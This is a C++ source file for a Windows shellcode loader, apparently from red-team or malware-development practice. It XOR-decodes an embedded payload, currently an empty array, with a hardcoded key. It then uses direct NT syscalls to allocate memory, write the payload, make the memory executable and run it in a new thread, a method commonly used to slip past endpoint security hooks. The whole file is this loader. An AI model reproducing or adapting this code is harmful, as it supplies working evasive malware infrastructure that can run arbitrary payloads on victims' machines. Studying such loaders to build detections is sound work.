#include <windows.h>
#include <iostream>
#include "syscalls_common.h"  

#define VERIFY_SUCCESS(func, status) \
    if (status != 0) { \
        printf("\n[!] %s failed! NTSTATUS: 0x%08X\n", func, status); \
        return 1; \
    }

int main() {
    unsigned char encryptedShellcode[] ="";

    char key[] = "L0c4L!iN7act0r!";

    size_t payloadSize = sizeof(encryptedShellcode) - 1;
    unsigned char* decoded = (unsigned char*)malloc(payloadSize);

    printf("[*] Decoding payload...\n");
    for (size_t i = 0; i < payloadSize; i++) {
        decoded[i] = encryptedShellcode[i] ^ key[i % (sizeof(key) - 1)];
    }


    PVOID lpAllocationStart = nullptr;
    HANDLE hProcess = GetCurrentProcess();
    HANDLE hThread = NULL;
    SIZE_T bytesWritten = 0;
    ULONG oldProtect = 0;
    NTSTATUS status;

    status = NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, &payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    VERIFY_SUCCESS("NtAllocateVirtualMemory", status);

    status = NtWriteVirtualMemory(hProcess, lpAllocationStart, decoded, payloadSize, &bytesWritten);
    VERIFY_SUCCESS("NtWriteVirtualMemory", status);

    PVOID bAddress = lpAllocationStart;
    SIZE_T bSize = payloadSize;
    status = NtProtectVirtualMemory(hProcess, &bAddress, &bSize, PAGE_EXECUTE_READ, &oldProtect);
    VERIFY_SUCCESS("NtProtectVirtualMemory", status);

    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpAllocationStart, NULL, FALSE, 0, 0, 0, NULL);
    VERIFY_SUCCESS("NtCreateThreadEx", status);

    printf("[+] Thread spawned. Check WinDbg.\n");
    WaitForSingleObject(hThread, INFINITE);

    free(decoded);
    return 0;
}
